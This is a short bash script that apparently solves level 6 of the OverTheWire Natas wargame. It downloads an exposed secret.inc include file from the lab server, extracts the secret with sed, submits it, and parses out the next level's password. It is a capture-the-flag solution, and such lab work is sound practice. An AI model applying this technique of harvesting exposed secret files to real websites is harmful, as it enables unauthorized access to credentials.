#!/bin/bash

BASIC=$(./natas5.sh)
SECRET=$(curl --user $BASIC http://natas6.natas.labs.overthewire.org/includes/secret.inc 2>/dev/null | sed -n "s/^.*secret\ =\ \"\(\w\+\)\".*$/\1/p")


curl --user $BASIC --data "secret=$SECRET&submit=" http://natas6.natas.labs.overthewire.org 2>/dev/null | sed -n "s/^.*\(natas[0-9]\+\)\ is\ \(\w\+\).*$/\1:\2/p"
